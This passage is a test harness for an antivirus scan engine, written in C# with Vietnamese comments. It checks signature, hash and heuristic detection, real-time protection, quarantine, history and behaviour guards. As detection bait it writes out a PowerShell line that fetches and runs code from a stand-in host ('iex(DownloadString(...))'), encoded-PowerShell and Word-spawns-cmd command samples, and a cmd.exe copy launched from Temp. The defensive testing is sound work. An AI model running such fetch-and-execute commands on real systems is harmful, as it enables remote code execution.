// Harness kiểm thử ScanEngine — biên dịch độc lập bằng csc, KHÔNG nằm trong csproj chính.
// Chạy (từ gốc repo):
// csc /out:test.exe /r:System.Windows.Forms.dll /r:System.Drawing.dll /r:System.Net.Http.dll /r:System.Management.dll
//   Services\ScanEngine.cs Services\RealTimeProtection.cs Services\QuarantineLedger.cs Services\ScanHistoryStore.cs
//   Services\VirusTotalClient.cs Services\AppSettings.cs Services\FeatureFlags.cs Services\GuardService.cs
//   Services\TestSamples.cs Services\DataDir.cs Tests\ScanEngineTest.cs  &&  test.exe
using ScanAndRemoveVirus.Services;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;

static class ScanEngineTest
{
    static int failures;
    static List<string> quarantineBefore;

    static void Check(string name, bool cond)
    {
        Console.WriteLine("{0}: {1}", cond ? "PASS" : "FAIL", name);
        if (!cond) failures++;
    }

    // Chờ async-guard ghi hit thỏa điều kiện (guard chạy trên ThreadPool)
    static bool WaitGuardHit(List<ThreatFound> hits, Func<ThreatFound, bool> match, int maxSeconds)
    {
        var until = DateTime.Now.AddSeconds(maxSeconds);
        while (DateTime.Now < until)
        {
            lock (hits) if (hits.Any(match)) return true;
            Thread.Sleep(250);
        }
        lock (hits) return hits.Any(match);
    }

    // Xác nhận im lặng tuyệt đối trong maxSeconds (chống false positive)
    static bool WaitGuardQuiet(List<ThreatFound> hits, int maxSeconds)
    {
        var until = DateTime.Now.AddSeconds(maxSeconds);
        while (DateTime.Now < until)
        {
            lock (hits) if (hits.Count > 0) return false;
            Thread.Sleep(250);
        }
        lock (hits) return hits.Count == 0;
    }

    // Ghi ADS Zone.Identifier (ZoneId=3) bằng CreateFileW — FileStream chặn ký tự ':' của ADS
    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
    static extern Microsoft.Win32.SafeHandles.SafeFileHandle CreateFileW(
        string name, uint access, uint share, IntPtr sa, uint disp, uint flags, IntPtr tmpl);

    static void WriteZoneId3(string path)
    {
        const uint GENERIC_WRITE = 0x40000000, CREATE_ALWAYS = 2, FILE_SHARE_ALL = 7,
                 FILE_ATTRIBUTE_NORMAL = 0x80;
        using (var h = CreateFileW(path + ":Zone.Identifier", GENERIC_WRITE, FILE_SHARE_ALL,
            IntPtr.Zero, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero))
        using (var fs = new FileStream(h, FileAccess.Write))
        {
            byte[] data = Encoding.ASCII.GetBytes("[ZoneTransfer]\r\nZoneId=3\r\n");
            fs.Write(data, 0, data.Length);
        }
    }

    static int Main()
    {
        // Test ghi vào kho dữ liệu riêng, không đụng scanhistory.log/quarantine thật của user
        Environment.SetEnvironmentVariable("XVIRUS_DATA_DIR",
            Path.Combine(Path.GetTempPath(), "xvirus-test-data-" + Guid.NewGuid().ToString("N")));
        string root = Path.Combine(Path.GetTempPath(), "xvirus-engine-test-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(root);
        quarantineBefore = Directory.Exists(ScanEngine.QuarantineDir)
            ? new List<string>(Directory.GetFiles(ScanEngine.QuarantineDir))
            : new List<string>();

        try
        {
            // ---- Chuẩn bị dữ liệu: 3 tệp, 2 "nhiễm" ----
            string clean = Path.Combine(root, "clean.txt");
            File.WriteAllText(clean, "hello world");

            string dirty = Path.Combine(root, "dirty.txt");
            File.WriteAllText(dirty, ScanEngine.TestSignature + "infected-content");

            string sub = Path.Combine(root, "nested");
            Directory.CreateDirectory(sub);
            string deep = Path.Combine(sub, "deep_eicar.bin"); // bắt theo tên tệp
            File.WriteAllText(deep, "whatever");

            // ---- Quét thư mục tùy chọn ----
            var result = ScanEngine.Scan(ScanType.Custom, root, CancellationToken.None);
            Console.WriteLine("Da quet {0} tep trong {1:N1}s", result.FilesScanned, result.Duration.TotalSeconds);
            Check("quét đủ 3 tệp", result.FilesScanned == 3);
            Check("phát hiện đúng 2 mối đe dọa", result.Threats.Count == 2);
            Check("bắt được dirty.txt (chữ ký)", result.Threats.Any(t => Path.GetFileName(t.FilePath) == "dirty.txt"));
            Check("bắt được deep_eicar.bin (tên tệp)", result.Threats.Any(t => Path.GetFileName(t.FilePath) == "deep_eicar.bin"));
            Check("không báo nhầm clean.txt", !result.Threats.Any(t => Path.GetFileName(t.FilePath) == "clean.txt"));

            // ---- Cách ly ----
            Check("cách ly dirty.txt thành công", ScanEngine.Quarantine(dirty));
            Check("tệp đã rời thư mục gốc", !File.Exists(dirty));
            Check("tệp nằm trong khu cách ly", ScanEngine.CountQuarantined() >= 1);

            // ---- Quét lại sau cách ly: deep_eicar.bin chưa bị cách ly nên còn 1 đe dọa ----
            var again = ScanEngine.Scan(ScanType.Custom, root, CancellationToken.None);
            Check("quét lại chỉ còn 2 tệp", again.FilesScanned == 2);
            Check("còn đúng 1 mối đe dọa (deep_eicar.bin)", again.Threats.Count == 1
                && Path.GetFileName(again.Threats[0].FilePath) == "deep_eicar.bin");
            Check("cách ly nốt deep_eicar.bin", ScanEngine.Quarantine(deep));
            var final = ScanEngine.Scan(ScanType.Custom, root, CancellationToken.None);
            Check("sau khi cách ly hết -> sạch", !final.HasThreats);

            // ---- Callback tiến trình ----
            int ticks = 0;
            ScanEngine.Scan(ScanType.Custom, root, CancellationToken.None, (n, p) => ticks++);
            Check("callback tiến trình được gọi", ticks > 0);

            // ---- Hủy giữa chừng ----
            bool cancelled = false;
            try
            {
                var cts = new CancellationTokenSource();
                cts.Cancel(); // hủy trước khi quét -> dừng ngay
                ScanEngine.Scan(ScanType.Custom, root, cts.Token);
            }
            catch (OperationCanceledException) { cancelled = true; }
            Check("hủy quét ném OperationCanceledException", cancelled);

            // ---- Stress HỦY giữa chừng (regression: race CompleteAdding vs worker từng làm chết app) ----
            // 8 vòng scan rồi cancel ở thời điểm ngẫu nhiên; nếu worker thread nào nổ exception
            // chưa bắt -> process chết -> không bao giờ in được dòng PASS dưới đây.
            string stress = Path.Combine(root, "cancelstress");
            for (int d = 0; d < 30; d++)
            {
                string dd = Directory.CreateDirectory(Path.Combine(stress, "d" + d)).FullName;
                string nd = Directory.CreateDirectory(Path.Combine(dd, "nested" + d)).FullName;
                for (int f = 0; f < 100; f++)
                {
                    File.WriteAllText(Path.Combine(dd, "f" + f + ".log"), new string('x', 60));
                    if (f % 10 == 0) File.WriteAllText(Path.Combine(nd, "g" + f + ".txt"), ScanEngine.TestSignature + f);
                }
            }
            int cancelOk = 0;
            var rnd = new Random(12345);
            for (int run = 0; run < 8; run++)
            {
                var ctsS = new CancellationTokenSource();
                Exception leaked = null; bool done = false;
                var thS = new Thread(() =>
                {
                    try { ScanEngine.Scan(ScanType.Custom, stress, ctsS.Token); }
                    catch (OperationCanceledException) { }
                    catch (Exception ex) { leaked = ex; }
                    done = true;
                });
                thS.IsBackground = true;
                thS.Start();
                Thread.Sleep(rnd.Next(5, 120)); // cancel đúng lúc worker đang push việc
                ctsS.Cancel();
                var waitUntil = DateTime.Now.AddSeconds(30);
                while (!done && DateTime.Now < waitUntil) Thread.Sleep(20);
                if (done && leaked == null) cancelOk++;
                else Console.WriteLine("  loop " + run + " leaked: " + leaked);
            }
            Check("stress: 8 lần scan+cutoff giữa chừng không giết process", cancelOk == 8);
            // Sau các lần hủy dở dang, quét tới nơi tới chốn vẫn phải ra kết quả đúng
            var fullStress = ScanEngine.Scan(ScanType.Custom, stress, CancellationToken.None);
            Check("stress: quét trọn vẹn vẫn đủ 3300 tệp", fullStress.FilesScanned == 3300);
            Check("stress: bắt đủ 300 đe dọa chữ ký trong stress", fullStress.Threats.Count == 300);

            // ---- Danh sách gốc quét nhanh / toàn bộ ----
            Check("roots quét nhanh khác rỗng", ScanEngine.GetScanRoots(ScanType.Quick, null).Any());
            Check("roots quét toàn bộ gồm C:\\", ScanEngine.GetScanRoots(ScanType.Full, null).Contains("C:\\"));

            // ================= 3 KỸ THUẬT QUÉT =================
            var engineRoot = Path.Combine(Path.GetTempPath(), "xvirus-techs-" + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(engineRoot);
            try
            {
                string techs = Path.Combine(engineRoot, "area");
                Directory.CreateDirectory(techs);

                // --- Kỹ thuật 1: hash SHA256 khớp bảng chữ ký (thử với mẫu mô phỏng tự sinh) ---
                // (không thử EICAR chuẩn ở đây vì Defender sẽ xóa tệp trước khi engine đọc được)
                string hashHit = Path.Combine(techs, "payload.txt");
                File.WriteAllText(hashHit, ScanEngine.SignatureSampleContent);
                var t1 = ScanEngine.EvaluateFile(hashHit);
                Check("[KT1] SHA256 khớp chữ ký Malsim.Sample.Hash",
                    t1 != null && t1.Kind == "Chữ ký" && t1.Reason.Contains("Malsim.Sample.Hash"));
                string hashMiss = Path.Combine(techs, "innocent.txt");
                File.WriteAllText(hashMiss, "totally harmless content, different bytes");
                Check("[KT1] nội dung khác -> không báo_hash", ScanEngine.EvaluateFile(hashMiss) == null);
                string preHit = Path.Combine(techs, "classic.txt");
                File.WriteAllText(preHit, ScanEngine.TestSignature + "old-style-signature-check");
                var t1b = ScanEngine.EvaluateFile(preHit);
                Check("[KT1] chữ ký byte đầu vẫn hoạt động", t1b != null && t1b.Kind == "Chữ ký");

                // --- Kỹ thuật 2: heuristic ---
                string spoof = Path.Combine(techs, "thong-bao-invoice.pdf.exe");
                File.WriteAllText(spoof, "not a real PE, just heuristic bait");
                var t2 = ScanEngine.EvaluateFile(spoof);
                Check("[KT2] đuôi kép giả mạo PDF + tên mồi câu -> Heuristic",
                    t2 != null && t2.Kind == "Heuristic" && t2.Reason.Contains("đuôi kép"));
                string evilPs1 = Path.Combine(techs, "update.ps1");
                File.AppendAllText(evilPs1,
                    "powershell -enc SQBFAFgA\r\n $s = 'aGVsbG8='; iex(DownloadString('http://x/y'))\r\n");
                var t2b = ScanEngine.EvaluateFile(evilPs1);
                Check("[KT2] script PowerShell độc -> Heuristic",
                    t2b != null && t2b.Kind == "Heuristic");
                string normal = Path.Combine(techs, "readme.txt");
                File.WriteAllText(normal, new string('a', 5000));
                Check("[KT2] tệp lành tính thường -> không báo nhầm", ScanEngine.EvaluateFile(normal) == null);
                string pdf = Path.Combine(techs, "report.pdf");
                File.WriteAllBytes(pdf, new byte[] { 0x25, 0x50, 0x44, 0x46 });
                Check("[KT2] PDF bé -> không báo nhầm", ScanEngine.EvaluateFile(pdf) == null);

                // --- Kỹ thuật 3: bảo vệ thời gian thực ---
                string watch = Path.Combine(techs, "watched");
                Directory.CreateDirectory(watch);
                var detected = new List<ThreatFound>();
                Action<ThreatFound> handler = detected.Add;
                RealTimeProtection.ThreatDetected += handler;
                AutoResetEvent signaled = new AutoResetEvent(false);
                RealTimeProtection.ThreatDetected += delegate { signaled.Set(); };
                RealTimeProtection.Start(new[] { watch });
                Check("[KT3] Start -> IsRunning", RealTimeProtection.IsRunning);

                string rtDirty = Path.Combine(watch, "brand-new-threat.txt");
                File.WriteAllText(rtDirty, ScanEngine.TestSignature + "written-after-watch-started-xxxxxxxx");
                bool got = signaled.WaitOne(TimeSpan.FromSeconds(15));
                if (!got) // thử lần 2 bằng heuristic (đảm bảo không phụ thuộc 1 luật)
                {
                    File.WriteAllText(rtDirty, ScanEngine.TestSignature + "retry-" + Guid.NewGuid());
                    got = signaled.WaitOne(TimeSpan.FromSeconds(15));
                }
                Check("[KT3] tệp mới thả vào vùng giám sát -> cảnh báo tức thì",
                    got && detected.Any(t => Path.GetFileName(t.FilePath) == "brand-new-threat.txt"));
                // tệp sạch không được phép gây cảnh báo
                detected.Clear();
                File.WriteAllText(Path.Combine(watch, "benign.txt"), new string('b', 4000));
                bool falseAlarm = signaled.WaitOne(TimeSpan.FromSeconds(3));
                Check("[KT3] tệp sạch -> không báo động", !falseAlarm && detected.Count == 0);
                RealTimeProtection.Stop();
                Check("[KT3] Stop -> không còn chạy", !RealTimeProtection.IsRunning);
                RealTimeProtection.ThreatDetected -= handler;
                Check("[KT3] phát hiện RT được ghi vào lịch sử", ScanHistoryStore.Entries()
                    .Any(h => h.Type == "Bảo vệ thời gian thực" && h.Scope.Contains("brand-new-threat.txt")));

                // --- Kỹ thuật 3 + Tự động cách ly: watcher tự dời tệp, không cần người bấm ---
                RealTimeProtection.AutoQuarantine = true;
                try
                {
                    string watch2 = Path.Combine(techs, "watched2");
                    Directory.CreateDirectory(watch2);
                    RealTimeProtection.Start(new[] { watch2 });
                    string autoDirty = Path.Combine(watch2, "auto-drop.txt");
                    File.WriteAllText(autoDirty, ScanEngine.TestSignature + "auto-quarantine-xxxx");
                    var until = DateTime.Now.AddSeconds(20);
                    while (DateTime.Now < until && File.Exists(autoDirty)) Thread.Sleep(250);
                    Check("[KT3] AutoQuarantine bật -> watcher tự cách ly tệp", !File.Exists(autoDirty));
                    if (!File.Exists(autoDirty))
                    {
                        var aqItem = ScanEngine.ListQuarantined()
                            . LastOrDefault(q => q.OriginalPath == autoDirty);
                        Check("[KT3] bản ghi sổ có lý do từ watcher",
                            aqItem != null && aqItem.Threat != null && aqItem.Threat.Contains("Chữ ký"));
                        if (aqItem != null) ScanEngine.DeleteQuarantined(aqItem.Id);
                    }
                    RealTimeProtection.Stop();
                }
                finally
                {
                    RealTimeProtection.AutoQuarantine = false;
                    if (RealTimeProtection.IsRunning) RealTimeProtection.Stop();
                }
            }
            finally
            {
                try { Directory.Delete(engineRoot, true); } catch { }
            }

            // ================= CÀI ĐẶT ỨNG DỤNG (AppSettings + Run registry) =================
            var cfgOld = AppSettings.Load();
            string backupRun = null;
            using (var k = Microsoft.Win32.Registry.CurrentUser
                       .OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", false))
                if (k != null) backupRun = k.GetValue("ScanAndRemoveVirus") as string;
            try
            {
                AppSettings.Save(new SettingsFlags
                {
                    AutoStart = true, AutoUpdate = true, SendSamples = true, ShowNotifications = false
                });
                var cfg = AppSettings.Load();
                Check("[Config] save/load round-trip flags",
                    cfg.AutoStart && cfg.AutoUpdate && cfg.SendSamples && !cfg.ShowNotifications);
                Check("[Config] ApplyAutoStart(true) ghi HKCU\\...\\Run",
                    AppSettings.ApplyAutoStart(true) && AppSettings.IsAutoStartEnabled());
                Check("[Config] ApplyAutoStart(false) gỡ khỏi Run",
                    AppSettings.ApplyAutoStart(false) && !AppSettings.IsAutoStartEnabled());
            }
            finally
            {
                AppSettings.Save(cfgOld);
                using (var w = Microsoft.Win32.Registry.CurrentUser
                           .OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (string.IsNullOrEmpty(backupRun))
                    { try { w.DeleteValue("ScanAndRemoveVirus", false); } catch { } }
                    else w.SetValue("ScanAndRemoveVirus", backupRun);
                }
            }

            // ============ SỔ CÁCH LY (quarantine ledger) + LỊCH SỬ (history store) ============
            var ledgerRoot = Path.Combine(Path.GetTempPath(), "xvirus-ledger-" + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(ledgerRoot);
            try
            {
                string qFile = Path.Combine(ledgerRoot, "quarantine-me.txt");

                // -- Restore đưa tệp về đúng đường dẫn cũ --
                File.WriteAllText(qFile, ScanEngine.TestSignature + "ledger-roundtrip");
                string storedId;
                Check("[Ledger] Quarantine + out id", ScanEngine.Quarantine(qFile, "Test ledger", out storedId)
                    && !string.IsNullOrEmpty(storedId) && !File.Exists(qFile));
                var listed = ScanEngine.ListQuarantined();
                var mine = listed.Where(q => q.Id == storedId).ToList();
                Check("[Ledger] ListQuarantined có bản ghi + đúng metadata",
                    mine.Count == 1 && mine[0].OriginalPath == qFile && mine[0].Threat == "Test ledger");
                Check("[Ledger] Restore thành công", ScanEngine.RestoreQuarantined(storedId));
                Check("[Ledger] tệp về lại vị trí cũ", File.Exists(qFile)
                    && File.ReadAllText(qFile).StartsWith(ScanEngine.TestSignature));
                Check("[Ledger] bản ghi bị gỡ sau restore",
                    !ScanEngine.ListQuarantined().Any(q => q.Id == storedId));

                // -- Xung đột tên khi restore: tạo lại tệp gốc rồi khôi phục --
                File.WriteAllText(qFile, ScanEngine.TestSignature + "ledger-roundtrip");
                ScanEngine.Quarantine(qFile, "Test conflict", out storedId);
                File.WriteAllText(qFile, "file gốc mới do người dùng tạo lại");
                ScanEngine.RestoreQuarantined(storedId);
                Check("[Ledger] không đè tệp gốc: tạo bản (1)",
                    File.ReadAllText(qFile) == "file gốc mới do người dùng tạo lại"
                    && File.Exists(Path.Combine(ledgerRoot, "quarantine-me (1).txt")));

                // -- Xóa vĩnh viễn --
                var remaining = ScanEngine.ListQuarantined().Where(q => q.OriginalPath.StartsWith(ledgerRoot)).ToList();
                foreach (var q in remaining)
                    Check("[Ledger] DeleteQuarantined " + q.Name, ScanEngine.DeleteQuarantined(q.Id));
                Check("[Ledger] sạch danh mục test ledger",
                    !ScanEngine.ListQuarantined().Any(q => q.OriginalPath.StartsWith(ledgerRoot)));

                // -- History store: add + thứ tự mới nhất trước + export CSV --
                ScanHistoryStore.Add("Quét nhanh", "scope A", 100, 2, 3.5);
                ScanHistoryStore.Add("Quét toàn bộ", "scope B", 200, 0, 0.4);
                var hist = ScanHistoryStore.Entries();
                Check("[History] thêm + đọc được", hist.Count >= 2);
                Check("[History] phần tử đầu là mới nhất",
                    hist[0].Type == "Quét toàn bộ" && hist[0].Result == "An toàn");
                Check("[History] entry có đe dọa -> Kết quả 'Phát hiện'",
                    hist.Any(h => h.Type == "Quét nhanh" && h.Threats == 2
                        && h.Result == "Phát hiện mối đe dọa"));
                string csv = Path.Combine(ledgerRoot, "report.csv");
                ScanHistoryStore.ExportCsv(csv);
                Check("[History] Export CSV có nội dung",
                    File.Exists(csv) && File.ReadAllLines(csv).Length >= 3);

                // -- Tem cập nhật CSDL dùng chung + helper dẫn xuất --
                string bak = File.Exists(ScanHistoryStore.SignatureUpdatePath)
                    ? File.ReadAllText(ScanHistoryStore.SignatureUpdatePath) : null;
                try
                {
                    var mark = new DateTime(2026, 1, 2, 3, 4, 5);
                    ScanHistoryStore.MarkSignatureUpdated(mark);
                    DateTime gotMark;
                    Check("[History] Mark/TryGet tem cập nhật CSDL",
                        ScanHistoryStore.TryGetLastSignatureUpdate(out gotMark)
                        && gotMark == mark);
                    Check("[History] LatestOfType('Quét') thấy phiên quét vừa ghi",
                        ScanHistoryStore.LatestOfType("Quét") != null);
                    Check("[History] TotalFilesScanned > 0 sau các test",
                        ScanHistoryStore.TotalFilesScanned() > 0);
                    Check("[History] TotalThreatsDetected > 0 sau các test",
                        ScanHistoryStore.TotalThreatsDetected() > 0);
                }
                finally
                {
                    if (bak != null) File.WriteAllText(ScanHistoryStore.SignatureUpdatePath, bak);
                }

                // ================= VIRUSTOTAL (tra cứu cloud theo hash) =================
                // Parse offline — payload rút gọn đúng format api/v3/files/{hash}
                var vtBad = VirusTotalClient.ParseReport(
                    "{\"data\":{\"attributes\":{\"last_analysis_stats\":"
                    + "{\"malicious\":57,\"undetected\":12,\"harmless\":0,\"suspicious\":1,\"timeout\":0}}}}");
                Check("[VT] parse: 57 malicious, 70 engine",
                    vtBad.Found && vtBad.Malicious == 57 && vtBad.TotalEngines == 70 && vtBad.IsMalicious);
                var vtClean = VirusTotalClient.ParseReport(
                    "{\"data\":{\"attributes\":{\"last_analysis_stats\":{\"malicious\":0,\"undetected\":72}}}}");
                Check("[VT] 0 malicious -> không độc", vtClean.Found && !vtClean.IsMalicious && !vtClean.IsSuspicious);
                var vt1 = VirusTotalClient.ParseReport(
                    "{\"data\":{\"attributes\":{\"last_analysis_stats\":{\"malicious\":1,\"undetected\":70}}}}");
                Check("[VT] 1 vendor đơn lẻ -> nghi ngờ, chưa kết luận độc", vt1.IsSuspicious && !vt1.IsMalicious);
                Check("[VT] JSON rác -> báo lỗi rõ ràng", VirusTotalClient.ParseReport("{}").Error != null);
                // SHA256 vector chuẩn NIST: "abc"
                string abcFile = Path.Combine(ledgerRoot, "abc.bin");
                File.WriteAllText(abcFile, "abc");
                Check("[VT] ComputeFileSha256 đúng vector 'abc'",
                    ScanEngine.ComputeFileSha256(abcFile) ==
                    "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
                // Không có key -> QueryHash phải báo lỗi thân thiện, không nổ exception
                string keyBak = File.Exists(VirusTotalClient.ApiKeyPath)
                    ? File.ReadAllText(VirusTotalClient.ApiKeyPath) : null;
                try
                {
                    if (File.Exists(VirusTotalClient.ApiKeyPath)) File.Delete(VirusTotalClient.ApiKeyPath);
                    var noKey = VirusTotalClient.QueryHash("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
                    Check("[VT] thiếu API key -> Error thân thiện, không exception",
                        noKey.Error != null && noKey.Error.Contains("API key"));
                }
                finally
                {
                    if (keyBak != null) File.WriteAllText(VirusTotalClient.ApiKeyPath, keyBak);
                }
                // Live test chỉ chạy khi máy đã cấu hình API key
                if (VirusTotalClient.IsConfigured)
                {
                    var live = VirusTotalClient.QueryHash(
                        "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538bbb857a133b");
                    // KHÔNG assert nội dung DB của VT (tài khoản/hash ngoài tầm kiểm soát repo) —
                    // chỉ đòi pipeline live chạy trọn: không exception, reply parse hợp lệ hoặc lỗi sạch.
                    if (live.Error != null) Console.WriteLine("  INFO live VT: " + live.Error);
                    else Console.WriteLine("  INFO live VT EICAR: " + live.Summary());
                    // Trạng thái hợp lệ = có lỗi, HOẶC thấy mẫu (kèm stats), HOẶC 404 sạch (0 engine)
                    Check("[VT] pipeline live trả trạng thái hợp lệ",
                        live.Error != null || live.Found || live.TotalEngines == 0);
                }
                else Console.WriteLine("  SKIP test live VirusTotal (chưa có API key)");
                File.Delete(abcFile);

                // ================= CÁC GUARD tab Bảo vệ =================
                string gdir = Path.Combine(Path.GetTempPath(), "xvirus-guard-" + Guid.NewGuid().ToString("N"));
                Directory.CreateDirectory(gdir);
                string settingsBak = File.Exists(AppSettings.SettingsPath)
                    ? File.ReadAllText(AppSettings.SettingsPath) : null;
                string dbBak = File.Exists(ScanHistoryStore.SignatureUpdatePath)
                    ? File.ReadAllText(ScanHistoryStore.SignatureUpdatePath) : null;
                var flagsWas = new bool[] { FeatureFlags.FileRestoreGuard, FeatureFlags.UsbProtection,
                    FeatureFlags.DownloadProtection, FeatureFlags.BehaviorWatch,
                    FeatureFlags.StartupFoldersWatch, FeatureFlags.VtAutoQuery, FeatureFlags.AutoUpdateEnabled };
                var guardHits = new List<ThreatFound>();
                Action<ThreatFound> guardHandler = delegate (ThreatFound t)
                {
                    lock (guardHits) guardHits.Add(t);
                };
                GuardService.ThreatDetected += guardHandler;
                try
                {
                    // --- hàm thuần: phát hiện ổ removable mới ---
                    var fresh = GuardService.DetectNewRemovable(
                        new List<string> { "D:\\" }, new[] { "D:\\", "E:\\", "F:\\" });
                    Check("[Guard] DetectNewRemovable chỉ ra ổ mới",
                        fresh.Count == 2 && fresh.Contains("E:\\") && fresh.Contains("F:\\"));

                    // --- luật hành vi (offline) ---
                    Check("[Guard] hành vi: exe chạy từ Temp bị chặn",
                        GuardService.BehaviorRuleHit(Path.Combine(Path.GetTempPath(), "s.exe"), "s.exe", "explorer.exe") != null);
                    Check("[Guard] hành vi: powershell -enc bị chặn",
                        GuardService.BehaviorRuleHit(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                            "powershell -nop -enc AAAA", "explorer.exe") != null);
                    Check("[Guard] hành vi: winword đẻ cmd bị chặn",
                        GuardService.BehaviorRuleHit(@"C:\Windows\System32\cmd.exe", "cmd /c whoami", "WINWORD.EXE") != null);
                    Check("[Guard] hành vi: app thường KHÔNG báo nhầm",
                        GuardService.BehaviorRuleHit(@"C:\Program Files\Git\bin\git.exe", "git status", "explorer.exe") == null);

                    // --- MOTW (Zone.Identifier) ---
                    string motwFile = Path.Combine(gdir, "from-web.txt");
                    File.WriteAllText(motwFile, "benign content");
                    string flagPath = Path.Combine(gdir, "no-flag.txt");
                    File.WriteAllText(flagPath, "benign content");
                    WriteZoneId3(motwFile);
                    Check("[Guard] nhận diện tệp tải từ Internet (ZoneId=3)",
                        GuardService.HasZoneIdentifier(motwFile) && !GuardService.HasZoneIdentifier(flagPath));

                    // --- Simulate USB: cắm "ổ" chứa tệp độc -> scan + event + history ---
                    string fakeUsb = Path.Combine(gdir, "usbdir");
                    Directory.CreateDirectory(fakeUsb);
                    File.WriteAllText(Path.Combine(fakeUsb, "usb-drop.txt"),
                        ScanEngine.TestSignature + "payload-on-usb-device!!!");
                    lock (guardHits) guardHits.Clear();
                    GuardService.SimulateUsbArrival(fakeUsb);
                    Check("[Guard] Simulate USB -> ThreatDetected",
                        WaitGuardHit(guardHits, t => t.FilePath != null && t.FilePath.Contains("usb-drop.txt"), 40));
                    Check("[Guard] Simulate USB ghi lịch sử 'Bảo vệ USB'", ScanHistoryStore.Entries()
                        .Any(h => h.Type == "Bảo vệ USB" && h.Threats > 0));

                    // --- Simulate Download (MOTW + file lạ đuôi -> force scan) ---
                    string dlDirty = Path.Combine(gdir, "invoice-setup.imgx");
                    File.WriteAllText(dlDirty, ScanEngine.TestSignature + "download-payload!!");
                    WriteZoneId3(dlDirty);
                    lock (guardHits) guardHits.Clear();
                    GuardService.SimulateDownloadArrival(dlDirty);
                    Check("[Guard] Download MOTW: quét cả đuôi LẠ (.imgx) qua force-content",
                        WaitGuardHit(guardHits, t => t.FilePath != null && t.FilePath.EndsWith("invoice-setup.imgx"), 15));

                    // --- File sạch NHƯNG tải từ Internet vẫn được soi: không dương tính giả ---
                    lock (guardHits) guardHits.Clear();
                    GuardService.SimulateDownloadArrival(motwFile);
                    Check("[Guard] Download tệp sạch -> im lặng", WaitGuardQuiet(guardHits, 4));

                    // --- Simulate StartUp folder ---
                    string stDirty = Path.Combine(gdir, " updater.exe");
                    File.WriteAllText(stDirty, ScanEngine.TestSignature + "startup-persists!!!");
                    lock (guardHits) guardHits.Clear();
                    GuardService.SimulateStartupArrival(stDirty);
                    Check("[Guard] StartUp: tệp độc mới rơi vào -> cảnh báo",
                        WaitGuardHit(guardHits, t => t.FilePath != null && t.FilePath.Contains("updater.exe"), 15));

                    // --- Restore guard: quét lại tệp đang cách ly ---
                    string rgFile = Path.Combine(gdir, "to-quarantine.txt");
                    File.WriteAllText(rgFile, ScanEngine.TestSignature + "restore guard test!");
                    string rgId;
                    ScanEngine.Quarantine(rgFile, "Guard restore test", out rgId);
                    Check("[Guard] RestoreWarningFor phát hiện tệp cách ly còn độc",
                        GuardService.RestoreWarningFor(new[] { rgId }) != null);
                    ScanEngine.DeleteQuarantined(rgId);

                    // --- FeatureFlags persist ---
                    FeatureFlags.VtAutoQuery = true;
                    FeatureFlags.Persist();
                    Check("[Guard] FeatureFlags lưu/nạp lại từ settings.ini",
                        AppSettings.Load().VtAutoQuery);

                    // --- Auto-update theo hạn ---
                    FeatureFlags.AutoUpdateEnabled = true;
                    File.WriteAllText(ScanHistoryStore.SignatureUpdatePath,
                        DateTime.Now.AddHours(-30).ToString("o"));
                    Check("[Guard] EnsureDailyAutoUpdate chạy khi tem quá 24h",
                        GuardService.EnsureDailyAutoUpdate());
                    Check("[Guard] ...và skip khi tem còn mới",
                        !GuardService.EnsureDailyAutoUpdate());

                    // --- WMI hành vi LIVE (best-effort; WMI block -> SKIP) ---
                    lock (guardHits) guardHits.Clear();
                    GuardService.Configure("behavior", true);
                    if (!GuardService.IsGuardRunning("behavior"))
                    {
                        Console.WriteLine("  SKIP test hành vi WMI live (WMI không khả dụng trên máy này)");
                    }
                    else
                    {
                        string evilCopy = Path.Combine(gdir, "evil-tmp-proc.exe");
                        File.Copy(Path.Combine(Environment.GetFolderPath(
                            Environment.SpecialFolder.System), "cmd.exe"), evilCopy);
                        var ps = System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                        {
                            FileName = evilCopy,
                            Arguments = "/c ping -n 9 127.0.0.1 > nul",
                            UseShellExecute = false,
                            CreateNoWindow = true
                        });
                        bool sawBehavior = WaitGuardHit(guardHits,
                            t => t.Reason != null && t.Reason.Contains("Temp")
                              && t.FilePath != null && t.FilePath.Contains("evil-tmp-proc"), 35);
                        Check("[Guard] WMI live: phát hiện tiến trình tung ra từ Temp", sawBehavior);
                        if (ps != null) { try { ps.Kill(); } catch { } }
                        GuardService.Configure("behavior", false);
                    }

                    // ============ BỘ MẪU 3 KỸ THUẬT (TestSamples) + UPLOAD PREFLIGHT ============
                    var samplesBak = new List<string>(); // giữ nguyên folder cũ nếu người dùng đã có
                    try
                    {
                        var sampleFiles = TestSamples.Create();
                        var sampleState = ScanEngine.Scan(ScanType.Custom, TestSamples.FolderPath, CancellationToken.None);
                        Check("[Mẫu] tạo đúng 11 tệp, idempotent",
                            sampleFiles.Count == 11 && File.Exists(sampleFiles[0]));
                        Check("[Mẫu] quét cả thư mục -> ĐÚNG 8 đe dọa (3 tệp sạch không bị báo)",
                            sampleState.FilesScanned == 11 && sampleState.Threats.Count == 8);
                        Check("[Mẫu] KT1-prefix: mau-ky-hieu.txt", sampleState.Threats.Any(t =>
                            t.FilePath.EndsWith(TestSamples.SignatureSampleName) && t.Kind == "Chữ ký"));
                        Check("[Mẫu] KT1-hash: mau-hash-sha256.txt (Malsim)", sampleState.Threats.Any(t =>
                            t.FilePath.EndsWith(TestSamples.HashSampleName) && t.Kind == "Chữ ký"
                            && t.Reason.Contains("Malsim")));
                        Check("[Mẫu] KT1-tên: demo_eicar_named.dat", sampleState.Threats.Any(t =>
                            t.FilePath.EndsWith(TestSamples.EicarNameSample) && t.Kind == "Chữ ký"));
                        Check("[Mẫu] KT1-prefix đuôi .js: hook-tien-ich.js (byte 0)", sampleState.Threats.Any(t =>
